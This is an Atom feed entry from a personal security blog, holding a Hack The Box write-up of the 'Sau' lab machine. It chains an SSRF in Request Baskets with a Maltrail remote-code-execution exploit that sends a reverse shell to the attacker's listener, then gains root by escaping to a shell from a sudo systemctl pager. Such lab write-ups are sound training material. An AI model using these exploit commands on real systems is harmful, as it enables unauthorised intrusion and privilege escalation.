term="ACSC"/><summary type="html"><![CDATA[Essential Eight security controls.]]></summary></entry><entry><title type="html">Sau</title><link href="https://emdeh.github.io/blog/2023/Sau/" rel="alternate" type="text/html" title="Sau"/><published>2023-10-16T14:14:00+00:00</published><updated>2023-10-16T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Sau</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Sau/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Sau is an Easy machine on Hack The Box that focuses on exploiting two vulnerabilities to ultimately obtain initial access. Privilege escalation is then achieved by exploiting a legitimate binary.</p> <h1 id="enumeration">Enumeration</h1> <p>Nmap reveals three ports:</p> <ul> <li>22</li> <li>80</li> <li>55555</li> </ul> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.82.3 <span class="nt">-oA</span> nmap-sau
 
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 15 Oct 2023 04:01:09 GMT
|     Content-Length: 75
|     invalid basket name<span class="p">;</span> the name does not match pattern: ^[wd-_<span class="se">\.</span><span class="o">]{</span>1,250<span class="o">}</span><span class="err">$</span>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Location: /web
|     Date: Sun, 15 Oct 2023 04:00:37 GMT
|     Content-Length: 27
|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 15 Oct 2023 04:00:38 GMT
|_    Content-Length: 0
&lt;SNIP&gt;
</code></pre></div></div> <p>SSH is a dead end and port 80 is filtered, but browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555</code> lands on a site titled <strong>Request Baskets</strong>.</p> <h2 id="whats-request-baskets">What’s Request Baskets?</h2> <p>Request Baskets is a concept, often implemented as a tool or a service, used to capture, inspect, and debug HTTP requests. It provides a temporary “basket” or “bucket” that captures incoming HTTP requests for analysis. This is particularly useful for debugging webhooks, HTTP clients, or other services that send HTTP requests.</p> <p>An implementation usually works like this:</p> <ol> <li><strong>Create</strong> a new Request Basket, which provides a unique URL endpoint.</li> <li><strong>Configure</strong> the application, webhook, or service to send HTTP requests to the URL.</li> <li><strong>Inspect</strong> the incoming HTTP requests to the basket</li> <li>Use the captured information, to <strong>test or debug issues</strong>, validate payloads, or run other types of tests.</li> </ol> <p>We can see that this particular implementation is on version 1.2.1, which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163"> <em>CVE-2023–27163 - a Server-Side Request Forgery (SSRF)</em></a></p> <h2 id="whats-ssrf">What’s SSRF?</h2> <p>SSRF, or Server-Side Request Forgery, is a security vulnerability that allows an attacker to make requests to internal resources within an organization’s network, effectively bypassing firewalls. In SSRF attacks, <strong><em>the attacker manipulates a vulnerable web application to make requests to an internal resource,</em></strong> which could be anything from cloud services to databases or even restricted parts of the web application itself.</p> <p>The attack often occurs when a web application doesn’t properly validate or sanitise user input for URLs. An attacker can then trick the server into making an unauthorised request to internal resources, potentially revealing sensitive information or even executing commands.</p> <p>It’s particularly concerning in cloud environments, where metadata APIs can expose sensitive data that can lead to more severe attacks like privilege escalation.</p> <p>Prevention often involves input validation, restricting outbound requests from the server, or implementing allow lists for permissible URLs.</p> <h1 id="attack-vector">Attack vector</h1> <p>Given port 80 is filtered but there is an implementation of Request Baskets on port 55555 that is vulnerable to SSRF, this appears to provide a way to forward requests to the service running on port 80. A PoC of the SSRF vulnerability on Request-Baskets can be found <a href="https://github.com/entr0pie/CVE-2023-27163">here</a>.</p> <h2 id="testing">Testing</h2> <p>Creating a new basket in the web app and then configuring port 80 as the forward URL on a local interface can confirm this.</p> <p>Hovering over the <code class="language-plaintext highlighter-rouge">Proxy Response</code> option, we can see it will <em>Proxy the response from the forward url back to the client</em>.</p> <p>Checking this option will return the response from <code class="language-plaintext highlighter-rouge">http://localhost:80</code>.</p> <p><img src="/assets/img/2023-sau/20231016-sau-2.png" class="auto-resize"/></p> <p>Triggering a request by browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555/wnnyr21</code> returns a seemingly malformed web app called <strong>Maltrail</strong>. <img src="/assets/img/2023-sau/20231016-sau-5.png" class="auto-resize"/></p> <p>The app is running version 0.53 which is vulnerable to a <strong>Remote Code Execution.</strong></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>searchsploit maltrail
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                       |  Path
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
Maltrail v0.53 - Unauthenticated Remote Code Executi | python/webapps/51676.py
</code></pre></div></div> <h1 id="initial-access">Initial access</h1> <p>Using the first exploit, a basket can be created that, when accessed, will make a request to <code class="language-plaintext highlighter-rouge">http://localhost:80</code>, as tested manually.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>./CVE-2023-27163.sh http://10.129.82.3:55555/ http://localhost:80
Proof-of-Concept of SSRF on Request-Baskets <span class="o">(</span>CVE-2023-27163<span class="o">)</span> <span class="o">||</span> More info at https://github.com/entr0pie/CVE-2023-27163

<span class="o">&gt;</span> Creating the <span class="s2">"ndapra"</span> proxy basket...
<span class="o">&gt;</span> Basket created!
<span class="o">&gt;</span> Accessing http://10.129.82.3:55555/ndapra now makes the server request to http://localhost:80.
./CVE-2023-27163.sh: line 43: jq: <span class="nb">command </span>not found
<span class="o">&gt;</span> Response body <span class="o">(</span>Authorization<span class="o">)</span>: <span class="o">{</span><span class="s2">"token"</span>:<span class="s2">"uQW06XHLrVKiZsq2XbeXRbrb6PRlQ53tTAVeaA-Puolb"</span><span class="o">}</span>
</code></pre></div></div> <p>This basket can then be used to proxy the second exploit to the vulnerable implementation of Maltrail.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>python3 51676.py 10.10.14.12 4321  http://10.129.82.3:55555/ndapra
Running exploit on http://10.129.82.3:55555/ndapra/login
</code></pre></div></div> <p>The payload is executed on the Maltrail instance running on port 80, and a reverse shell is sucessfully caught on the listener.</p> <p><img src="/assets/img/2023-sau/20231016-sau-3.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Privilege escalation is reasonably straight forward.</p> <p>Checking what the user can run as sudo returns one binary: <code class="language-plaintext highlighter-rouge">/usr/bin/systemctl status trail.service</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puma on sau:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User puma may run the following commands on sau:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
</code></pre></div></div> <p><a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFOBIns</a> says the following about <code class="language-plaintext highlighter-rouge">systemctl</code> ran as sudo:</p> <blockquote> <p><em>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.</em></p> </blockquote> <p>Running the binary seems to drop into a new terminal session:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
</code></pre></div></div> <p>Attempting to execute a new shell from this terminal will spawn it under sudo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)!</span>/bin/sh
<span class="o">!</span>//bbiinn//sshh!/bin/sh
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
</code></pre></div></div> <p><img src="/assets/img/2023-sau/20231016-sau-4.png" class="auto-resize"/></p> <p>Done and dusted!</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="RCE"/><category term="SSRF"/><summary type="html"><![CDATA[Sau - Hack The Box write-up.]]></summary></entry></feed>